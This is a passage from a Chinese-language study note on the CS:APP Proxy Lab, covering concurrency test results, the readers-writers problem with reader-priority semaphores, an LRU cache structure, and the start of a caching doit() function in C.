</span><span id=__span-191-9><a id=__codelineno-191-9 name=__codelineno-191-9></a><span class=w>        </span><span class=n>doit</span><span class=p>(</span><span class=n>connfd</span><span class=p>);</span>
</span><span id=__span-191-10><a id=__codelineno-191-10 name=__codelineno-191-10></a><span class=w>        </span><span class=c1>// 关闭客户端的连接描述符</span>
</span><span id=__span-191-11><a id=__codelineno-191-11 name=__codelineno-191-11></a><span class=w>        </span><span class=n>Close</span><span class=p>(</span><span class=n>connfd</span><span class=p>);</span>
</span><span id=__span-191-12><a id=__codelineno-191-12 name=__codelineno-191-12></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-191-13><a id=__codelineno-191-13 name=__codelineno-191-13></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <h4 id=_35>测试与结果<a class=headerlink href=#_35 title="Permanent link">¶</a></h4> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-192-1> 1</a></span>
<span class=normal><a href=#__codelineno-192-2> 2</a></span>
<span class=normal><a href=#__codelineno-192-3> 3</a></span>
<span class=normal><a href=#__codelineno-192-4> 4</a></span>
<span class=normal><a href=#__codelineno-192-5> 5</a></span>
<span class=normal><a href=#__codelineno-192-6> 6</a></span>
<span class=normal><a href=#__codelineno-192-7> 7</a></span>
<span class=normal><a href=#__codelineno-192-8> 8</a></span>
<span class=normal><a href=#__codelineno-192-9> 9</a></span>
<span class=normal><a href=#__codelineno-192-10>10</a></span>
<span class=normal><a href=#__codelineno-192-11>11</a></span>
<span class=normal><a href=#__codelineno-192-12>12</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-192-1><a id=__codelineno-192-1 name=__codelineno-192-1></a><span class=m>09</span>-Proxy-Lab$<span class=w> </span>make<span class=w> </span>clean<span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span>make<span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span>./driver.sh
</span><span id=__span-192-2><a id=__codelineno-192-2 name=__codelineno-192-2></a>***<span class=w> </span>Concurrency<span class=w> </span>***
</span><span id=__span-192-3><a id=__codelineno-192-3 name=__codelineno-192-3></a>Starting<span class=w> </span>tiny<span class=w> </span>on<span class=w> </span>port<span class=w> </span><span class=m>19416</span>
</span><span id=__span-192-4><a id=__codelineno-192-4 name=__codelineno-192-4></a>Starting<span class=w> </span>proxy<span class=w> </span>on<span class=w> </span>port<span class=w> </span><span class=m>29575</span>
</span><span id=__span-192-5><a id=__codelineno-192-5 name=__codelineno-192-5></a>Starting<span class=w> </span>the<span class=w> </span>blocking<span class=w> </span>NOP<span class=w> </span>server<span class=w> </span>on<span class=w> </span>port<span class=w> </span><span class=m>18281</span>
</span><span id=__span-192-6><a id=__codelineno-192-6 name=__codelineno-192-6></a>Trying<span class=w> </span>to<span class=w> </span>fetch<span class=w> </span>a<span class=w> </span>file<span class=w> </span>from<span class=w> </span>the<span class=w> </span>blocking<span class=w> </span>nop-server
</span><span id=__span-192-7><a id=__codelineno-192-7 name=__codelineno-192-7></a>Fetching<span class=w> </span>./tiny/home.html<span class=w> </span>into<span class=w> </span>./.noproxy<span class=w> </span>directly<span class=w> </span>from<span class=w> </span>Tiny
</span><span id=__span-192-8><a id=__codelineno-192-8 name=__codelineno-192-8></a>Fetching<span class=w> </span>./tiny/home.html<span class=w> </span>into<span class=w> </span>./.proxy<span class=w> </span>using<span class=w> </span>the<span class=w> </span>proxy
</span><span id=__span-192-9><a id=__codelineno-192-9 name=__codelineno-192-9></a>Checking<span class=w> </span>whether<span class=w> </span>the<span class=w> </span>proxy<span class=w> </span>fetch<span class=w> </span>succeeded
</span><span id=__span-192-10><a id=__codelineno-192-10 name=__codelineno-192-10></a>Success:<span class=w> </span>Was<span class=w> </span>able<span class=w> </span>to<span class=w> </span>fetch<span class=w> </span>tiny/home.html<span class=w> </span>from<span class=w> </span>the<span class=w> </span>proxy.
</span><span id=__span-192-11><a id=__codelineno-192-11 name=__codelineno-192-11></a>Killing<span class=w> </span>tiny,<span class=w> </span>proxy,<span class=w> </span>and<span class=w> </span>nop-server
</span><span id=__span-192-12><a id=__codelineno-192-12 name=__codelineno-192-12></a>concurrencyScore:<span class=w> </span><span class=m>15</span>/15
</span></code></pre></div></td></tr></table></div> </li> <li> <h3 id=part-3-caching-web-objects>Part 3: Caching web objects<a class=headerlink href=#part-3-caching-web-objects title="Permanent link">¶</a></h3> <p>在 Proxy 中，当多个客户端或一个客户端多次访问同一个服务端的同一对象时，Proxy 每次都要从服务端请求，这是很耗费时间的。如果 Proxy 能把访问过的对象存储下来，那么再次遇到同样的请求时，就不需要再连接到服务端了，可以直接回复给客户端。而 Cache 的大小并不是无限的，所以就又要考虑替换策略，本实验要求使用 LRU。</p> <h4 id=-_1>读者-写者模型<a class=headerlink href=#-_1 title="Permanent link">¶</a></h4> <p>一组并发的线程要访问同一个共享对象时，将只读对象的线程叫做读者，只修改对象的进程叫做写者。写者必须拥有对对象的独占的访问，而读者可以与其它读者共享对象。该模型分为两类：</p> <ul> <li>读优先：要求不让读者等待</li> <li>写优先：要求在写者之后到达的读者必须等待</li> </ul> <p>对于读者优先，只要有其它读者，则就应让读者先读，因此设置一个 <code>read_cnt</code> 记录读者数量，这个变量对于读者来说也是互斥的，所以设置一个 <code>mutex</code> 信号量来保护，读的过程中不允许写者写，写的过程不允许读者读，所以设置 <code>w</code> 来保护共享对象。</p> <p>读优先代码：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-193-1> 1</a></span>
<span class=normal><a href=#__codelineno-193-2> 2</a></span>
<span class=normal><a href=#__codelineno-193-3> 3</a></span>
<span class=normal><a href=#__codelineno-193-4> 4</a></span>
<span class=normal><a href=#__codelineno-193-5> 5</a></span>
<span class=normal><a href=#__codelineno-193-6> 6</a></span>
<span class=normal><a href=#__codelineno-193-7> 7</a></span>
<span class=normal><a href=#__codelineno-193-8> 8</a></span>
<span class=normal><a href=#__codelineno-193-9> 9</a></span>
<span class=normal><a href=#__codelineno-193-10>10</a></span>
<span class=normal><a href=#__codelineno-193-11>11</a></span>
<span class=normal><a href=#__codelineno-193-12>12</a></span>
<span class=normal><a href=#__codelineno-193-13>13</a></span>
<span class=normal><a href=#__codelineno-193-14>14</a></span>
<span class=normal><a href=#__codelineno-193-15>15</a></span>
<span class=normal><a href=#__codelineno-193-16>16</a></span>
<span class=normal><a href=#__codelineno-193-17>17</a></span>
<span class=normal><a href=#__codelineno-193-18>18</a></span>
<span class=normal><a href=#__codelineno-193-19>19</a></span>
<span class=normal><a href=#__codelineno-193-20>20</a></span>
<span class=normal><a href=#__codelineno-193-21>21</a></span>
<span class=normal><a href=#__codelineno-193-22>22</a></span>
<span class=normal><a href=#__codelineno-193-23>23</a></span>
<span class=normal><a href=#__codelineno-193-24>24</a></span>
<span class=normal><a href=#__codelineno-193-25>25</a></span>
<span class=normal><a href=#__codelineno-193-26>26</a></span>
<span class=normal><a href=#__codelineno-193-27>27</a></span>
<span class=normal><a href=#__codelineno-193-28>28</a></span>
<span class=normal><a href=#__codelineno-193-29>29</a></span>
<span class=normal><a href=#__codelineno-193-30>30</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-193-1><a id=__codelineno-193-1 name=__codelineno-193-1></a><span class=kt>int</span><span class=w> </span><span class=n>read_cnt</span><span class=p>;</span>
</span><span id=__span-193-2><a id=__codelineno-193-2 name=__codelineno-193-2></a><span class=n>sem_t</span><span class=w> </span><span class=n>mutex</span><span class=p>,</span><span class=w> </span><span class=n>w</span><span class=p>;</span><span class=w>    </span><span class=c1>//都初始化为1</span>
</span><span id=__span-193-3><a id=__codelineno-193-3 name=__codelineno-193-3></a>
</span><span id=__span-193-4><a id=__codelineno-193-4 name=__codelineno-193-4></a><span class=kt>void</span><span class=w> </span><span class=nf>reader</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span><span class=w> </span>
</span><span id=__span-193-5><a id=__codelineno-193-5 name=__codelineno-193-5></a><span class=p>{</span>
</span><span id=__span-193-6><a id=__codelineno-193-6 name=__codelineno-193-6></a><span class=w>    </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span><span id=__span-193-7><a id=__codelineno-193-7 name=__codelineno-193-7></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-193-8><a id=__codelineno-193-8 name=__codelineno-193-8></a><span class=w>        </span><span class=n>P</span><span class=p>(</span><span class=o>&amp;</span><span class=n>mutex</span><span class=p>);</span>
</span><span id=__span-193-9><a id=__codelineno-193-9 name=__codelineno-193-9></a><span class=w>        </span><span class=n>readcnt</span><span class=o>++</span><span class=p>;</span>
</span><span id=__span-193-10><a id=__codelineno-193-10 name=__codelineno-193-10></a><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>readcnt</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>1</span><span class=p>)</span>
</span><span id=__span-193-11><a id=__codelineno-193-11 name=__codelineno-193-11></a><span class=w>            </span><span class=n>P</span><span class=p>(</span><span class=o>&amp;</span><span class=n>w</span><span class=p>);</span>
</span><span id=__span-193-12><a id=__codelineno-193-12 name=__codelineno-193-12></a><span class=w>        </span><span class=n>V</span><span class=p>(</span><span class=o>&amp;</span><span class=n>mutex</span><span class=p>);</span>
</span><span id=__span-193-13><a id=__codelineno-193-13 name=__codelineno-193-13></a>
</span><span id=__span-193-14><a id=__codelineno-193-14 name=__codelineno-193-14></a><span class=w>        </span><span class=n>P</span><span class=p>(</span><span class=o>&amp;</span><span class=n>mutex</span><span class=p>);</span>
</span><span id=__span-193-15><a id=__codelineno-193-15 name=__codelineno-193-15></a><span class=w>        </span><span class=n>readcnt</span><span class=o>--</span><span class=p>;</span>
</span><span id=__span-193-16><a id=__codelineno-193-16 name=__codelineno-193-16></a><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>readcnt</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>0</span><span class=p>)</span>
</span><span id=__span-193-17><a id=__codelineno-193-17 name=__codelineno-193-17></a><span class=w>            </span><span class=n>V</span><span class=p>(</span><span class=o>&amp;</span><span class=n>w</span><span class=p>);</span>
</span><span id=__span-193-18><a id=__codelineno-193-18 name=__codelineno-193-18></a><span class=w>        </span><span class=n>V</span><span class=p>(</span><span class=o>&amp;</span><span class=n>mutex</span><span class=p>);</span>
</span><span id=__span-193-19><a id=__codelineno-193-19 name=__codelineno-193-19></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-193-20><a id=__codelineno-193-20 name=__codelineno-193-20></a><span class=p>}</span>
</span><span id=__span-193-21><a id=__codelineno-193-21 name=__codelineno-193-21></a>
</span><span id=__span-193-22><a id=__codelineno-193-22 name=__codelineno-193-22></a><span class=kt>void</span><span class=w> </span><span class=nf>writer</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
</span><span id=__span-193-23><a id=__codelineno-193-23 name=__codelineno-193-23></a><span class=p>{</span>
</span><span id=__span-193-24><a id=__codelineno-193-24 name=__codelineno-193-24></a><span class=w>    </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span><span id=__span-193-25><a id=__codelineno-193-25 name=__codelineno-193-25></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-193-26><a id=__codelineno-193-26 name=__codelineno-193-26></a><span class=w>        </span><span class=n>P</span><span class=p>(</span><span class=o>&amp;</span><span class=n>w</span><span class=p>);</span>
</span><span id=__span-193-27><a id=__codelineno-193-27 name=__codelineno-193-27></a><span class=w>        </span><span class=p>...</span>
</span><span id=__span-193-28><a id=__codelineno-193-28 name=__codelineno-193-28></a><span class=w>        </span><span class=n>V</span><span class=p>(</span><span class=o>&amp;</span><span class=n>w</span><span class=p>)</span>
</span><span id=__span-193-29><a id=__codelineno-193-29 name=__codelineno-193-29></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-193-30><a id=__codelineno-193-30 name=__codelineno-193-30></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <p>只有第一个读者对 <code>w</code> 加锁，最后一个读者解锁。因此一旦有一个读者加锁，写者就无法访问这个共享对象了，而其它读者可以随意访问。</p> <h4 id=cache_1>Cache 结构<a class=headerlink href=#cache_1 title="Permanent link">¶</a></h4> <p>在本实验中，对 Cache 的访问就是一个经典的读者-写者问题。有的线程要从 Cache 中读出，有的线程要写入 Cache。显然，为了 Proxy 更加高效，这里应该用读优先的模型。定义如下的 Cache 结构:</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-194-1> 1</a></span>
<span class=normal><a href=#__codelineno-194-2> 2</a></span>
<span class=normal><a href=#__codelineno-194-3> 3</a></span>
<span class=normal><a href=#__codelineno-194-4> 4</a></span>
<span class=normal><a href=#__codelineno-194-5> 5</a></span>
<span class=normal><a href=#__codelineno-194-6> 6</a></span>
<span class=normal><a href=#__codelineno-194-7> 7</a></span>
<span class=normal><a href=#__codelineno-194-8> 8</a></span>
<span class=normal><a href=#__codelineno-194-9> 9</a></span>
<span class=normal><a href=#__codelineno-194-10>10</a></span>
<span class=normal><a href=#__codelineno-194-11>11</a></span>
<span class=normal><a href=#__codelineno-194-12>12</a></span>
<span class=normal><a href=#__codelineno-194-13>13</a></span>
<span class=normal><a href=#__codelineno-194-14>14</a></span>
<span class=normal><a href=#__codelineno-194-15>15</a></span>
<span class=normal><a href=#__codelineno-194-16>16</a></span>
<span class=normal><a href=#__codelineno-194-17>17</a></span>
<span class=normal><a href=#__codelineno-194-18>18</a></span>
<span class=normal><a href=#__codelineno-194-19>19</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-194-1><a id=__codelineno-194-1 name=__codelineno-194-1></a><span class=c1>// Cache结构</span>
</span><span id=__span-194-2><a id=__codelineno-194-2 name=__codelineno-194-2></a><span class=k>typedef</span><span class=w> </span><span class=k>struct</span>
</span><span id=__span-194-3><a id=__codelineno-194-3 name=__codelineno-194-3></a><span class=p>{</span>
</span><span id=__span-194-4><a id=__codelineno-194-4 name=__codelineno-194-4></a><span class=w>    </span><span class=kt>char</span><span class=w> </span><span class=n>obj</span><span class=p>[</span><span class=n>MAX_OBJECT_SIZE</span><span class=p>];</span>
</span><span id=__span-194-5><a id=__codelineno-194-5 name=__codelineno-194-5></a><span class=w>    </span><span class=kt>char</span><span class=w> </span><span class=n>uri</span><span class=p>[</span><span class=n>MAXLINE</span><span class=p>];</span>
</span><span id=__span-194-6><a id=__codelineno-194-6 name=__codelineno-194-6></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>LRU</span><span class=p>;</span>
</span><span id=__span-194-7><a id=__codelineno-194-7 name=__codelineno-194-7></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>isEmpty</span><span class=p>;</span>
</span><span id=__span-194-8><a id=__codelineno-194-8 name=__codelineno-194-8></a>
</span><span id=__span-194-9><a id=__codelineno-194-9 name=__codelineno-194-9></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>read_cnt</span><span class=p>;</span><span class=w> </span><span class=c1>// 读者数量</span>
</span><span id=__span-194-10><a id=__codelineno-194-10 name=__codelineno-194-10></a><span class=w>    </span><span class=n>sem_t</span><span class=w> </span><span class=n>w</span><span class=p>;</span><span class=w>      </span><span class=c1>// Cache信号量</span>
</span><span id=__span-194-11><a id=__codelineno-194-11 name=__codelineno-194-11></a><span class=w>    </span><span class=n>sem_t</span><span class=w> </span><span class=n>mutex</span><span class=p>;</span><span class=w>  </span><span class=c1>// read_cnt信号量</span>
</span><span id=__span-194-12><a id=__codelineno-194-12 name=__codelineno-194-12></a>
</span><span id=__span-194-13><a id=__codelineno-194-13 name=__codelineno-194-13></a><span class=p>}</span><span class=w> </span><span class=n>block</span><span class=p>;</span>
</span><span id=__span-194-14><a id=__codelineno-194-14 name=__codelineno-194-14></a>
</span><span id=__span-194-15><a id=__codelineno-194-15 name=__codelineno-194-15></a><span class=k>typedef</span><span class=w> </span><span class=k>struct</span>
</span><span id=__span-194-16><a id=__codelineno-194-16 name=__codelineno-194-16></a><span class=p>{</span>
</span><span id=__span-194-17><a id=__codelineno-194-17 name=__codelineno-194-17></a><span class=w>    </span><span class=n>block</span><span class=w> </span><span class=n>data</span><span class=p>[</span><span class=n>MAX_CACHE</span><span class=p>];</span>
</span><span id=__span-194-18><a id=__codelineno-194-18 name=__codelineno-194-18></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>num</span><span class=p>;</span>
</span><span id=__span-194-19><a id=__codelineno-194-19 name=__codelineno-194-19></a><span class=p>}</span><span class=w> </span><span class=n>Cache</span><span class=p>;</span>
</span></code></pre></div></td></tr></table></div> <h4 id=_36>代码<a class=headerlink href=#_36 title="Permanent link">¶</a></h4> <p>在<code>doit</code>函数中，得到一个请求后，先根据 uri 判断 Cache 中是否存在这个内容，如果存在，则直接回复；如果不存在，则连接服务器，回复结束后，把内容写进 Cache:</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-195-1> 1</a></span>
<span class=normal><a href=#__codelineno-195-2> 2</a></span>
<span class=normal><a href=#__codelineno-195-3> 3</a></span>
<span class=normal><a href=#__codelineno-195-4> 4</a></span>
<span class=normal><a href=#__codelineno-195-5> 5</a></span>
<span class=normal><a href=#__codelineno-195-6> 6</a></span>
<span class=normal><a href=#__codelineno-195-7> 7</a></span>
<span class=normal><a href=#__codelineno-195-8> 8</a></span>
<span class=normal><a href=#__codelineno-195-9> 9</a></span>
<span class=normal><a href=#__codelineno-195-10>10</a></span>
<span class=normal><a href=#__codelineno-195-11>11</a></span>
<span class=normal><a href=#__codelineno-195-12>12</a></span>
<span class=normal><a href=#__codelineno-195-13>13</a></span>
<span class=normal><a href=#__codelineno-195-14>14</a></span>
<span class=normal><a href=#__codelineno-195-15>15</a></span>
<span class=normal><a href=#__codelineno-195-16>16</a></span>
<span class=normal><a href=#__codelineno-195-17>17</a></span>
<span class=normal><a href=#__codelineno-195-18>18</a></span>
<span class=normal><a href=#__codelineno-195-19>19</a></span>
<span class=normal><a href=#__codelineno-195-20>20</a></span>
<span class=normal><a href=#__codelineno-195-21>21</a></span>
<span class=normal><a href=#__codelineno-195-22>22</a></span>
<span class=normal><a href=#__codelineno-195-23>23</a></span>
<span class=normal><a href=#__codelineno-195-24>24</a></span>
<span class=normal><a href=#__codelineno-195-25>25</a></span>
<span class=normal><a href=#__codelineno-195-26>26</a></span>
<span class=normal><a href=#__codelineno-195-27>27</a></span>
<span class=normal><a href=#__codelineno-195-28>28</a></span>
<span class=normal><a href=#__codelineno-195-29>29</a></span>
<span class=normal><a href=#__codelineno-195-30>30</a></span>
<span class=normal><a href=#__codelineno-195-31>31</a></span>
<span class=normal><a href=#__codelineno-195-32>32</a></span>
<span class=normal><a href=#__codelineno-195-33>33</a></span>
<span class=normal><a href=#__codelineno-195-34>34</a></span>
<span class=normal><a href=#__codelineno-195-35>35</a></span>
<span class=normal><a href=#__codelineno-195-36>36</a></span>
<span class=normal><a href=#__codelineno-195-37>37</a></span>
<span class=normal><a href=#__codelineno-195-38>38</a></span>
<span class=normal><a href=#__codelineno-195-39>39</a></span>
<span class=normal><a href=#__codelineno-195-40>40</a></span>
<span class=normal><a href=#__codelineno-195-41>41</a></span>
<span class=normal><a href=#__codelineno-195-42>42</a></span>
<span class=normal><a href=#__codelineno-195-43>43</a></span>
<span class=normal><a href=#__codelineno-195-44>44</a></span>
<span class=normal><a href=#__codelineno-195-45>45</a></span>
<span class=normal><a href=#__codelineno-195-46>46</a></span>
<span class=normal><a href=#__codelineno-195-47>47</a></span>
<span class=normal><a href=#__codelineno-195-48>48</a></span>
<span class=normal><a href=#__codelineno-195-49>49</a></span>
<span class=normal><a href=#__codelineno-195-50>50</a></span>
<span class=normal><a href=#__codelineno-195-51>51</a></span>
<span class=normal><a href=#__codelineno-195-52>52</a></span>
<span class=normal><a href=#__codelineno-195-53>53</a></span>
<span class=normal><a href=#__codelineno-195-54>54</a></span>
<span class=normal><a href=#__codelineno-195-55>55</a></span>
<span class=normal><a href=#__codelineno-195-56>56</a></span>
<span class=normal><a href=#__codelineno-195-57>57</a></span>
<span class=normal><a href=#__codelineno-195-58>58</a></span>
<span class=normal><a href=#__codelineno-195-59>59</a></span>
<span class=normal><a href=#__codelineno-195-60>60</a></span>
<span class=normal><a href=#__codelineno-195-61>61</a></span>
<span class=normal><a href=#__codelineno-195-62>62</a></span>
<span class=normal><a href=#__codelineno-195-63>63</a></span>
<span class=normal><a href=#__codelineno-195-64>64</a></span>
<span class=normal><a href=#__codelineno-195-65>65</a></span>
<span class=normal><a href=#__codelineno-195-66>66</a></span>
<span class=normal><a href=#__codelineno-195-67>67</a></span>
<span class=normal><a href=#__codelineno-195-68>68</a></span>
<span class=normal><a href=#__codelineno-195-69>69</a></span>
<span class=normal><a href=#__codelineno-195-70>70</a></span>
<span class=normal><a href=#__codelineno-195-71>71</a></span>
<span class=normal><a href=#__codelineno-195-72>72</a></span>
<span class=normal><a href=#__codelineno-195-73>73</a></span>
<span class=normal><a href=#__codelineno-195-74>74</a></span>
<span class=normal><a href=#__codelineno-195-75>75</a></span>
<span class=normal><a href=#__codelineno-195-76>76</a></span>
<span class=normal><a href=#__codelineno-195-77>77</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-195-1><a id=__codelineno-195-1 name=__codelineno-195-1></a><span class=kt>void</span><span class=w> </span><span class=nf>doit</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>connfd</span><span class=p>)</span>
</span><span id=__span-195-2><a id=__codelineno-195-2 name=__codelineno-195-2></a><span class=p>{</span>
</span><span id=__span-195-3><a id=__codelineno-195-3 name=__codelineno-195-3></a><span class=w>    </span><span class=kt>char</span><span class=w> </span><span class=n>buf</span><span class=p>[</span><span class=n>MAXLINE</span><span class=p>],</span><span class=w> </span><span class=n>method</span><span class=p>[</span><span class=n>MAXLINE</span><span class=p>],</span><span class=w> </span><span class=n>uri</span><span class=p>[</span><span class=n>MAXLINE</span><span class=p>],</span><span class=w> </span><span class=n>version</span><span class=p>[</span><span class=n>MAXLINE</span><span class=p>];</span>
</span><span id=__span-195-4><a id=__codelineno-195-4 name=__codelineno-195-4></a><span class=w>    </span><span class=kt>char</span><span class=w> </span><span class=n>server</span><span class=p>[</span><span class=n>MAXLINE</span><span class=p>];</span>
</span><span id=__span-195-5><a id=__codelineno-195-5 name=__codelineno-195-5></a>
</span><span id=__span-195-6><a id=__codelineno-195-6 name=__codelineno-195-6></a><span class=w>    </span><span class=n>rio_t</span><span class=w> </span><span class=n>rio</span><span class=p>,</span><span class=w> </span><span class=n>server_rio</span><span class=p>;</span>
</span><span id=__span-195-7><a id=__codelineno-195-7 name=__codelineno-195-7></a>
</span><span id=__span-195-8><a id=__codelineno-195-8 name=__codelineno-195-8></a><span class=w>    </span><span class=kt>char</span><span class=w> </span><span class=n>cache_tag</span><span class=p>[</span><span class=n>MAXLINE</span><span class=p>];</span>
</span><span id=__span-195-9><a id=__codelineno-195-9 name=__codelineno-195-9></a><span class=w>    </span><span class=n>Rio_readinitb</span><span class=p>(</span><span class=o>&amp;</span><span class=n>rio</span><span class=p>,</span><span class=w> </span><span class=n>connfd</span><span class=p>);</span>
</span><span id=__span-195-10><a id=__codelineno-195-10 name=__codelineno-195-10></a><span class=w>    </span><span class=n>Rio_readlineb</span><span class=p>(</span><span class=o>&amp;</span><span class=n>rio</span><span class=p>,</span><span class=w> </span><span class=n>buf</span><span class=p>,</span><span class=w> </span><span class=n>MAXLINE</span><span class=p>);</span>
</span><span id=__span-195-11><a id=__codelineno-195-11 name=__codelineno-195-11></a><span class=w>    </span><span class=n>sscanf</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span><span class=w> </span><span class=s>"%s %s %s"</span><span class=p>,</span><span class=w> </span><span class=n>method</span><span class=p>,</span><span class=w> </span><span class=n>uri</span><span class=p>,</span><span class=w> </span><span class=n>version</span><span class=p>);</span>
</span><span id=__span-195-12><a id=__codelineno-195-12 name=__codelineno-195-12></a><span class=w>    </span><span class=n>strcpy</span><span class=p>(</span><span class=n>cache_tag</span><span class=p>,</span><span class=w> </span><span class=n>uri</span><span class=p>);</span>
</span><span id=__span-195-13><a id=__codelineno-195-13 name=__codelineno-195-13></a>
</span><span id=__span-195-14><a id=__codelineno-195-14 name=__codelineno-195-14></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>strcasecmp</span><span class=p>(</span><span class=n>method</span><span class=p>,</span><span class=w> </span><span class=s>"GET"</span><span class=p>))</span>
</span><span id=__span-195-15><a id=__codelineno-195-15 name=__codelineno-195-15></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-195-16><a id=__codelineno-195-16 name=__codelineno-195-16></a><span class=w>        </span><span class=n>printf</span><span class=p>(</span><span class=s>"Proxy does not implement the method"</span><span class=p>);</span>
</span><span id=__span-195-17><a id=__codelineno-195-17 name=__codelineno-195-17></a><span class=w>        </span><span class=k>return</span><span class=p>;</span>
</span><span id=__span-195-18><a id=__codelineno-195-18 name=__codelineno-195-18></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-195-19><a id=__codelineno-195-19 name=__codelineno-195-19></a>
</span><span id=__span-195-20><a id=__codelineno-195-20 name=__codelineno-195-20></a><span class=w>    </span><span class=k>struct</span><span class=w> </span><span class=nc>Uri</span><span class=w> </span><span class=o>*</span><span class=n>uri_data</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=k>struct</span><span class=w> </span><span class=nc>Uri</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=n>malloc</span><span class=p>(</span><span class=k>sizeof</span><span class=p>(</span><span class=k>struct</span><span class=w> </span><span class=nc>Uri</span><span class=p>));</span>
</span><span id=__span-195-21><a id=__codelineno-195-21 name=__codelineno-195-21></a><span class=w>    </span><span class=c1>//判断uri是否缓存，若缓存，直接回复</span>
</span><span id=__span-195-22><a id=__codelineno-195-22 name=__codelineno-195-22></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=p>;</span>
</span><span id=__span-195-23><a id=__codelineno-195-23 name=__codelineno-195-23></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>((</span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>get_Cache</span><span class=p>(</span><span class=n>cache_tag</span><span class=p>))</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=mi>-1</span><span class=p>)</span>
</span><span id=__span-195-24><a id=__codelineno-195-24 name=__codelineno-195-24></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-195-25><a id=__codelineno-195-25 name=__codelineno-195-25></a><span class=w>        </span><span class=c1>// 加锁</span>
</span><span id=__span-195-26><a id=__codelineno-195-26 name=__codelineno-195-26></a><span class=w>        </span><span class=n>P</span><span class=p>(</span><span class=o>&amp;</span><span class=n>cache</span><span class=p>.</span><span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>mutex</span><span class=p>);</span>
</span><span id=__span-195-27><a id=__codelineno-195-27 name=__codelineno-195-27></a><span class=w>        </span><span class=n>cache</span><span class=p>.</span><span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>read_cnt</span><span class=o>++</span><span class=p>;</span>
</span><span id=__span-195-28><a id=__codelineno-195-28 name=__codelineno-195-28></a><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>cache</span><span class=p>.</span><span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>read_cnt</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>1</span><span class=p>)</span>
</span><span id=__span-195-29><a id=__codelineno-195-29 name=__codelineno-195-29></a><span class=w>            </span><span class=n>P</span><span class=p>(</span><span class=o>&amp;</span><span class=n>cache</span><span class=p>.</span><span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>w</span><span class=p>);</span>
</span><span id=__span-195-30><a id=__codelineno-195-30 name=__codelineno-195-30></a><span class=w>        </span><span class=n>V</span><span class=p>(</span><span class=o>&amp;</span><span class=n>cache</span><span class=p>.</span><span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>mutex</span><span class=p>);</span>
</span><span id=__span-195-31><a id=__codelineno-195-31 name=__codelineno-195-31></a>
</span><span id=__span-195-32><a id=__codelineno-195-32 name=__codelineno-195-32></a><span class=w>        </span><span class=n>Rio_writen</span><span class=p>(</span><span class=n>connfd</span><span class=p>,</span><span class=w> </span><span class=n>cache</span><span class=p>.</span><span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>obj</span><span class=p>,</span><span class=w> </span><span class=n>strlen</span><span class=p>(</span><span class=n>cache</span><span class=p>.</span><span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>obj</span><span class=p>));</span>
</span><span id=__span-195-33><a id=__codelineno-195-33 name=__codelineno-195-33></a>
</span><span id=__span-195-34><a id=__codelineno-195-34 name=__codelineno-195-34></a><span class=w>        </span><span class=n>P</span><span class=p>(</span><span class=o>&amp;</span><span class=n>cache</span><span class=p>.</span><span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>mutex</span><span class=p>);</span>
